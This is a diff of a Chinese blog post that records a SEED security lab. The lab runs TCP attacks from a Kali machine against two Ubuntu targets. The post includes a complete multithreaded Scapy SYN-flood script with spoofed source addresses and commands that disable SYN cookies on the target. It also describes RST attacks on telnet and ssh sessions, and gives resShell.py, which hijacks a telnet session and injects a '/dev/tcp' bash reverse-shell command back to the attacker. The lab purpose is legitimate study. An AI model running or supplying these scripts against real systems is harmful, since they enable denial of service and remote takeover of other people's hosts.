@@ -90,12 +90,12 @@
 
 
 
-<meta name="description" content="实验目的 Task1. SYN Flooding Attack用Scapy构造SYN包，观察攻击效果，解释现象及原因。 Task2.TCP RST Attacks on telnet and ssh Connections应用Scapy，解释需要构造报文中的关键数据及其值获取 Task3.TCP Session Hijacking回显主机上的文件（自行取）内容。在受害机上Wireshark观察劫持">
+<meta name="description" content="实验目的  Task1. SYN Flooding Attack 用Scapy构造SYN包，观察攻击效果，解释现象及原因。 Task2.TCP RST Attacks on telnet and ssh Connections 应用Scapy，解释需要构造报文中的关键数据及其值获取 Task3.TCP Session Hijacking 回显主机上的文件（自行取）内容。在受害机上Wireshar">
 <meta property="og:type" content="article">
 <meta property="og:title" content="scapy实现TCP Attacks">
 <meta property="og:url" content="http://yoursite.com/posts/5acb07a3/index.html">
 <meta property="og:site_name" content="风屿の博客">
-<meta property="og:description" content="实验目的 Task1. SYN Flooding Attack用Scapy构造SYN包，观察攻击效果，解释现象及原因。 Task2.TCP RST Attacks on telnet and ssh Connections应用Scapy，解释需要构造报文中的关键数据及其值获取 Task3.TCP Session Hijacking回显主机上的文件（自行取）内容。在受害机上Wireshark观察劫持">
+<meta property="og:description" content="实验目的  Task1. SYN Flooding Attack 用Scapy构造SYN包，观察攻击效果，解释现象及原因。 Task2.TCP RST Attacks on telnet and ssh Connections 应用Scapy，解释需要构造报文中的关键数据及其值获取 Task3.TCP Session Hijacking 回显主机上的文件（自行取）内容。在受害机上Wireshar">
 <meta property="og:image" content="http://yoursite.com/images/loading.gif">
 <meta property="og:image" content="http://yoursite.com/images/loading.gif">
 <meta property="og:image" content="http://yoursite.com/images/loading.gif">
@@ -410,7 +410,7 @@
                   <span class="post-meta-item-text">字数统计&#58;</span>
                 
                 <span title="字数统计">
-                  2k
+                  2.1k
                 </span>
               
 
@@ -435,20 +435,28 @@
       
 
       
-        <h1 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h1><ul>
-<li>Task1. SYN Flooding Attack<br>用Scapy构造SYN包，观察攻击效果，解释现象及原因。</li>
-<li>Task2.TCP RST Attacks on telnet and ssh Connections<br>应用Scapy，解释需要构造报文中的关键数据及其值获取</li>
-<li>Task3.TCP Session Hijacking<br>回显主机上的文件（自行取）内容。在受害机上Wireshark观察劫持后，与服务器的TCP通信信息，解释原因。</li>
-<li>Task4.Creating Reverse Shell using TCP Hijacking<br>将受害主机外壳反弹至攻击机<a id="more"></a></li>
+        <h1 id="实验目的"><a class="markdownIt-Anchor" href="#实验目的"></a> 实验目的</h1>
+<ul>
+<li>Task1. SYN Flooding Attack<br>
+用Scapy构造SYN包，观察攻击效果，解释现象及原因。</li>
+<li>Task2.TCP RST Attacks on telnet and ssh Connections<br>
+应用Scapy，解释需要构造报文中的关键数据及其值获取</li>
+<li>Task3.TCP Session Hijacking<br>
+回显主机上的文件（自行取）内容。在受害机上Wireshark观察劫持后，与服务器的TCP通信信息，解释原因。</li>
+<li>Task4.Creating Reverse Shell using TCP Hijacking<br>
+将受害主机外壳反弹至攻击机<a id="more"></a></li>
 </ul>
-<h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验配置"><a href="#实验配置" class="headerlink" title="实验配置"></a>实验配置</h2><p>攻击机：            kali-linux-2019  192.168.2.207 </p>
-<p>靶机A(server): SEEDUbuntu16 192.168.2.101  </p>
-<p>靶机B(client):  SEEDUbuntu16 192.168.2.121   </p>
-<h2 id="SYN-Flooding-Attack"><a href="#SYN-Flooding-Attack" class="headerlink" title="SYN Flooding Attack"></a>SYN Flooding Attack</h2><p>实验代码:</p>
+<h1 id="实验过程"><a class="markdownIt-Anchor" href="#实验过程"></a> 实验过程</h1>
+<h2 id="实验配置"><a class="markdownIt-Anchor" href="#实验配置"></a> 实验配置</h2>
+<p>攻击机：            kali-linux-2019  192.168.2.207</p>
+<p>靶机A(server): SEEDUbuntu16 192.168.2.101</p>
+<p>靶机B(client):  SEEDUbuntu16 192.168.2.121</p>
+<h2 id="syn-flooding-attack"><a class="markdownIt-Anchor" href="#syn-flooding-attack"></a> SYN Flooding Attack</h2>
+<p>实验代码:</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> multiprocessing</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">logging.getLogger(<span class="string">'scapy.runtime'</span>).setLevel(logging.ERROR)</span><br><span class="line"></span><br><span class="line">cpu_count = multiprocessing.cpu_count()</span><br><span class="line">total_packets = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_syn_packet</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    ip_layer = IP()</span><br><span class="line">    tcp_layer = TCP()</span><br><span class="line"></span><br><span class="line">    ip_layer.src = <span class="string">'%i.%i.%i.%i'</span> %(</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>),</span><br><span class="line">         random.randint(<span class="number">1</span>, <span class="number">254</span>))  <span class="comment">#随机IP地址</span></span><br><span class="line">    tcp_layer.sport = random.randint(<span class="number">1</span>, <span class="number">65535</span>)</span><br><span class="line">    <span class="comment">#随机端口</span></span><br><span class="line">    tcp_layer.flags = <span class="string">'S'</span>  <span class="comment">#flag设置为syn</span></span><br><span class="line"></span><br><span class="line">    ip_layer.dst = ip</span><br><span class="line">    tcp_layer.dport = port</span><br><span class="line"></span><br><span class="line">    send(ip_layer / tcp_layer, verbose=<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#verbose=0表示不输出中间结果</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">syn_flood</span><span class="params">(ip, port)</span>:</span></span><br><span class="line">    <span class="keyword">global</span> total_packets</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:  <span class="comment">#循环发送</span></span><br><span class="line">        send_syn_packet(ip, port)</span><br><span class="line">        total_packets += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> total_packets % <span class="number">100</span> == <span class="number">0</span>:</span><br><span class="line">            print(<span class="string">'Total packets: %i'</span> % total_packets)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        print(<span class="string">'%s &lt;Interface&gt; &lt;Target IP&gt; &lt;Target port&gt;'</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">'Flooding is started...'</span>)</span><br><span class="line"></span><br><span class="line">    conf.iface = sys.argv[<span class="number">1</span>]  <span class="comment">#网卡接口</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">#多线程提高发送速度</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(cpu_count):</span><br><span class="line">        threading.Thread(target=syn_flood,</span><br><span class="line">                         args=(sys.argv[<span class="number">2</span>], int(sys.argv[<span class="number">3</span>]))).start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
 <p>对于靶机A：</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="SHELL"><figure class="iseeu highlight /shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo sysctl -w net.ipv4.tcp_syncookies=0  #关闭syn cookies防御机制</span><br><span class="line">sudo sysctl -w net.ipv4.tcp_max_syn_backlog=128 #设置tcp连接队列长度backlog为小数值，使实验现象更明显</span><br></pre></td></tr></table></figure></div>
-<p>kali攻击机运行synflood.py，攻击靶机A的23端口</p>
+<p><a href="http://xn--kalisynflood-0m5t596sbjggj7lry0a.py">kali攻击机运行synflood.py</a>，攻击靶机A的23端口</p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PLAIN"><figure class="iseeu highlight /plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 synflood.py eth0 192.168.2.101 23</span><br></pre></td></tr></table></figure></div>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331202311177.png" alt="image-20200331202311177"></p>
 <p>kali攻击机抓包：</p>
@@ -462,7 +470,8 @@
 <p>靶机B 对 靶机A发起TCP连接</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331203147266.png" alt="image-20200331203147266"></p>
 <p>无法连接</p>
-<h3 id="现象及原因解释"><a href="#现象及原因解释" class="headerlink" title="现象及原因解释"></a>现象及原因解释</h3><p><strong>TCP有限状态机图</strong></p>
+<h3 id="现象及原因解释"><a class="markdownIt-Anchor" href="#现象及原因解释"></a> 现象及原因解释</h3>
+<p><strong>TCP有限状态机图</strong></p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200322212016601.png" alt="img"></p>
 <p>当靶机A收到SYN后，会进入SYN_RCVD状态，并发送SYN，ACK等待攻击机的ACK（第三次握手），处于半连接状态</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401105811910.png" alt="image-20200401105811910"></p>
@@ -470,7 +479,9 @@
 <p>关闭攻击机的SYN Flood攻击<br>再次发起连接</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331203254919.png" alt="image-20200331203254919"></p>
 <p>连接成功</p>
-<h2 id="TCP-RST-Attacks"><a href="#TCP-RST-Attacks" class="headerlink" title="TCP RST Attacks"></a>TCP RST Attacks</h2><h3 id="telnet-Connections"><a href="#telnet-Connections" class="headerlink" title="telnet Connections"></a>telnet Connections</h3><p>靶机B向靶机A发起telnet连接</p>
+<h2 id="tcp-rst-attacks"><a class="markdownIt-Anchor" href="#tcp-rst-attacks"></a> TCP RST Attacks</h2>
+<h3 id="telnet-connections"><a class="markdownIt-Anchor" href="#telnet-connections"></a> telnet Connections</h3>
+<p>靶机B向靶机A发起telnet连接</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331212705785.png" alt="image-20200331212705785"></p>
 <p>A开启wireshark接受信息，最后一个tcp报文如下图</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331213144875.png" alt="image-20200331213144875"></p>
@@ -479,11 +490,12 @@
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331214820722.png" alt="image-20200331214820722"></p>
 <p>259为攻击机发送给靶机A的报文</p>
 <p>当靶机B再次往telnet键入信息</p>
-<p>靶机A接收到了报文260，但是A发送了RST报文261强制关闭连接 </p>
+<p>靶机A接收到了报文260，但是A发送了RST报文261强制关闭连接</p>
 <p>靶机B出现如下结果</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331215229928.png" alt="image-20200331215229928"></p>
 <p>攻击成功</p>
-<h3 id="ssh-Connections"><a href="#ssh-Connections" class="headerlink" title="ssh Connections"></a>ssh Connections</h3><p>用同样的方法断开ssh连接</p>
+<h3 id="ssh-connections"><a class="markdownIt-Anchor" href="#ssh-connections"></a> ssh Connections</h3>
+<p>用同样的方法断开ssh连接</p>
 <p>靶机B向靶机A发起连接</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331215624510.png" alt="image-20200331215624510"></p>
 <p>靶机A的末报文</p>
@@ -492,11 +504,12 @@
 <p>攻击机向靶机A发送了RST报文101</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331220033722.png" alt="image-20200331220033722"></p>
 <p>当靶机B再次往ssh键入信息</p>
-<p>靶机A接收到了报文103，但是A发送了RST报文104强制关闭连接 </p>
+<p>靶机A接收到了报文103，但是A发送了RST报文104强制关闭连接</p>
 <p>靶机B出现如下结果</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331220316492.png" alt="image-20200331220316492"></p>
 <p>攻击成功</p>
-<h2 id="TCP-Session-Hijacking"><a href="#TCP-Session-Hijacking" class="headerlink" title="TCP Session Hijacking"></a>TCP Session Hijacking</h2><p>使用netcat实现</p>
+<h2 id="tcp-session-hijacking"><a class="markdownIt-Anchor" href="#tcp-session-hijacking"></a> TCP Session Hijacking</h2>
+<p>使用netcat实现</p>
 <p>靶机A下有个secret文件</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331221502518.png" alt="image-20200331221502518"></p>
 <p>靶机B输入</p>
@@ -530,13 +543,15 @@
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331233856924.png" alt="image-20200331233856924"></p>
 <p>kali攻击机回显</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200331233928089.png" alt="image-20200331233928089"></p>
-<h3 id="原因解释"><a href="#原因解释" class="headerlink" title="原因解释"></a>原因解释</h3><p>本次实验的TCP会话劫持是利用中间人的方法</p>
+<h3 id="原因解释"><a class="markdownIt-Anchor" href="#原因解释"></a> 原因解释</h3>
+<p>本次实验的TCP会话劫持是利用中间人的方法</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/session1.png" alt="img"></p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/session2.png" alt="img"></p>
 <p>通过了解服务机的最后一个接收的ACK报文，攻击者（kali）伪造相同seq和ack的相似TCP报文， 使得服务器认为是正常的ACK报文并接收。 如果这个连接是Telnet会话，攻击者（kali攻击机）可以在该会话中注入恶意命令，导致受害者（服务机靶机A）执行恶意命令。通过重定向命令将受害者（靶机A）的命令执行内容重定向到攻击机，完成攻击。</p>
-<h2 id="Creating-Reverse-Shell-using-TCP-Hijacking"><a href="#Creating-Reverse-Shell-using-TCP-Hijacking" class="headerlink" title="Creating Reverse Shell using TCP Hijacking"></a>Creating Reverse Shell using TCP Hijacking</h2><p>此实验仅需将Data换成<code>&#39;\r nohup /bin/bash -i &gt; /dev/tcp/&#39; + localIP + &#39;/9090 2&gt;&amp;1 0&lt;&amp;1\r&#39;</code>，其中localIP是kali机的IP，<code>/bin/bash</code>是linux机上的shell应用。</p>
+<h2 id="creating-reverse-shell-using-tcp-hijacking"><a class="markdownIt-Anchor" href="#creating-reverse-shell-using-tcp-hijacking"></a> Creating Reverse Shell using TCP Hijacking</h2>
+<p>此实验仅需将Data换成<code>'\r nohup /bin/bash -i &gt; /dev/tcp/' + localIP + '/9090 2&gt;&amp;1 0&lt;&amp;1\r'</code>，其中localIP是kali机的IP，<code>/bin/bash</code>是linux机上的shell应用。</p>
 <p>让kali攻击机作为中间人自动获取靶机A的ACK报文来伪造发送ACK报文，自动获得反弹shell。</p>
-<p>resShell.py</p>
+<p><a href="http://resShell.py">resShell.py</a></p>
 <div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="PYTHON"><figure class="iseeu highlight /python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"><span class="keyword">import</span> netifaces</span><br><span class="line"><span class="keyword">from</span> scapy.all <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">__author__ = <span class="string">'Asymptotic_freedom'</span></span><br><span class="line"></span><br><span class="line">victimIP = <span class="literal">None</span></span><br><span class="line">localIP = <span class="literal">None</span></span><br><span class="line">localPort = <span class="literal">None</span></span><br><span class="line">haveSent = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">help_text</span><span class="params">()</span>:</span></span><br><span class="line">    print(</span><br><span class="line">        <span class="string">"\nUsage:\n python3 resShell.py &lt;Interface&gt; &lt;Target IP&gt; &lt;Local port&gt;\n"</span></span><br><span class="line">    )</span><br><span class="line">    sys.exit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sniff(filter=<span class="string">'tcp'</span>, prn=resShell)</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        exit(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resShell</span><span class="params">(pkt)</span>:</span></span><br><span class="line">    <span class="string">'''反向shell，仅发送一次ack包'''</span></span><br><span class="line">    <span class="keyword">global</span> localIP, victimIP, localPort, haveSent</span><br><span class="line">    ipsrc = pkt[IP].src</span><br><span class="line">    ipdst = pkt[IP].dst</span><br><span class="line">    <span class="keyword">if</span> haveSent <span class="keyword">or</span> ipdst != victimIP <span class="keyword">or</span> pkt[</span><br><span class="line">            TCP].flags != <span class="string">'A'</span> <span class="keyword">or</span> ipsrc == localIP:</span><br><span class="line">        <span class="keyword">return</span></span><br><span class="line">    haveSent = <span class="literal">True</span></span><br><span class="line">    print(<span class="string">"Have sent the hijacking packet: %s -&gt; %s ..."</span> % (ipsrc, ipdst))</span><br><span class="line">    tsp = pkt[TCP].sport</span><br><span class="line">    tdp = pkt[TCP].dport</span><br><span class="line">    tseq = pkt[TCP].seq</span><br><span class="line">    tack = pkt[TCP].ack</span><br><span class="line">    IPLayer = IP(src=ipsrc, dst=ipdst)</span><br><span class="line">    TCPLayer = TCP(sport=tsp, dport=tdp, flags=<span class="string">'A'</span>, seq=tseq, ack=tack)</span><br><span class="line">    Data = <span class="string">'\r nohup /bin/bash -i &gt; /dev/tcp/'</span> + localIP + <span class="string">'/'</span> + localPort + <span class="string">' 2&gt;&amp;1 0&lt;&amp;1 \r'</span></span><br><span class="line">    pkt = IPLayer / TCPLayer / Data</span><br><span class="line">    send(pkt, verbose=<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> interface, victimIP, localPort, localIP</span><br><span class="line">    <span class="keyword">if</span> len(sys.argv) != <span class="number">4</span>:</span><br><span class="line">        help_text()</span><br><span class="line">    interface = sys.argv[<span class="number">1</span>]</span><br><span class="line">    victimIP = sys.argv[<span class="number">2</span>]</span><br><span class="line">    localPort = sys.argv[<span class="number">3</span>]</span><br><span class="line">    localIP = netifaces.ifaddresses(interface)[<span class="number">2</span>][<span class="number">0</span>][<span class="string">'addr'</span>]</span><br><span class="line">    <span class="comment">#创建一个线程运行exploit()函数</span></span><br><span class="line">    th = threading.Thread(target=exploit)</span><br><span class="line">    th.setDaemon(<span class="literal">True</span>)  <span class="comment">#把当前进程设置为守护线程，主线程执行完毕，子线程均停止</span></span><br><span class="line">    th.start()</span><br><span class="line">    <span class="comment">#主线程运行</span></span><br><span class="line">    os.system(<span class="string">"nc -lvp "</span> + localPort)  <span class="comment">#开启监听端口</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure></div>
 <p>首先客户机靶机B向靶机A发起telnet连接，成功建立连接后运行python程序，输入相关数据后靶机B往telnet键入任意字符。</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401165154685.png" alt="image-20200401165154685"></p>
@@ -546,7 +561,8 @@
 <p>当反弹shell生成后，靶机B的telnet的连接便失去了正常通信</p>
 <p>但是当靶机B关掉当前未响应的终端，kali攻击机的反弹shell便马上断开连接</p>
 <p><img src="/images/loading.gif" data-original="/posts/5acb07a3/image-20200401165239243.png" alt="image-20200401165239243"></p>
-<h1 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h1><p>本次实验复现了伪造TCP报文的各种攻击，其中反弹shell的脚本存在缺陷：一是无法在后台运行(使用nohup &amp;依然不行)，当靶机B断开连接后shell马上断开；二是shell连接未能实现匿名IP连接；三是只有靶机A、B已经建立连接后才可以获得反向shell，先启动python脚本再建立连接并不能成功建立连接。</p>
+<h1 id="实验总结"><a class="markdownIt-Anchor" href="#实验总结"></a> 实验总结</h1>
+<p>本次实验复现了伪造TCP报文的各种攻击，其中反弹shell的脚本存在缺陷：一是无法在后台运行(使用nohup &amp;依然不行)，当靶机B断开连接后shell马上断开；二是shell连接未能实现匿名IP连接；三是只有靶机A、B已经建立连接后才可以获得反向shell，先启动python脚本再建立连接并不能成功建立连接。</p>
 
       
     </div>
@@ -781,7 +797,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验目的"><span class="nav-number">1.</span> <span class="nav-text">实验目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验过程"><span class="nav-number">2.</span> <span class="nav-text">实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验配置"><span class="nav-number">2.1.</span> <span class="nav-text">实验配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#SYN-Flooding-Attack"><span class="nav-number">2.2.</span> <span class="nav-text">SYN Flooding Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#现象及原因解释"><span class="nav-number">2.2.1.</span> <span class="nav-text">现象及原因解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP-RST-Attacks"><span class="nav-number">2.3.</span> <span class="nav-text">TCP RST Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet-Connections"><span class="nav-number">2.3.1.</span> <span class="nav-text">telnet Connections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-Connections"><span class="nav-number">2.3.2.</span> <span class="nav-text">ssh Connections</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#TCP-Session-Hijacking"><span class="nav-number">2.4.</span> <span class="nav-text">TCP Session Hijacking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原因解释"><span class="nav-number">2.4.1.</span> <span class="nav-text">原因解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Creating-Reverse-Shell-using-TCP-Hijacking"><span class="nav-number">2.5.</span> <span class="nav-text">Creating Reverse Shell using TCP Hijacking</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验总结"><span class="nav-number">3.</span> <span class="nav-text">实验总结</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#实验目的"><span class="nav-number">1.</span> <span class="nav-text"> 实验目的</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验过程"><span class="nav-number">2.</span> <span class="nav-text"> 实验过程</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#实验配置"><span class="nav-number">2.1.</span> <span class="nav-text"> 实验配置</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#syn-flooding-attack"><span class="nav-number">2.2.</span> <span class="nav-text"> SYN Flooding Attack</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#现象及原因解释"><span class="nav-number">2.2.1.</span> <span class="nav-text"> 现象及原因解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcp-rst-attacks"><span class="nav-number">2.3.</span> <span class="nav-text"> TCP RST Attacks</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#telnet-connections"><span class="nav-number">2.3.1.</span> <span class="nav-text"> telnet Connections</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#ssh-connections"><span class="nav-number">2.3.2.</span> <span class="nav-text"> ssh Connections</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#tcp-session-hijacking"><span class="nav-number">2.4.</span> <span class="nav-text"> TCP Session Hijacking</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#原因解释"><span class="nav-number">2.4.1.</span> <span class="nav-text"> 原因解释</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#creating-reverse-shell-using-tcp-hijacking"><span class="nav-number">2.5.</span> <span class="nav-text"> Creating Reverse Shell using TCP Hijacking</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#实验总结"><span class="nav-number">3.</span> <span class="nav-text"> 实验总结</span></a></li></ol></div>
             
 
           </div>
@@ -1554,7 +1570,7 @@
         </span>
     </div>
 </div>
-https://i.imgur.com/AZULc9Y.png
+
 <script>
   function back2top(){
     $('html, body').animate({scrollTop: 0}, 500);
@@ -1589,9 +1605,9 @@ https://i.imgur.com/AZULc9Y.png
     POWERMODE.colorful = true;
     POWERMODE.shake = false;
     document.body.addEventListener('input', POWERMODE);
-  </script>
+  </script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
 
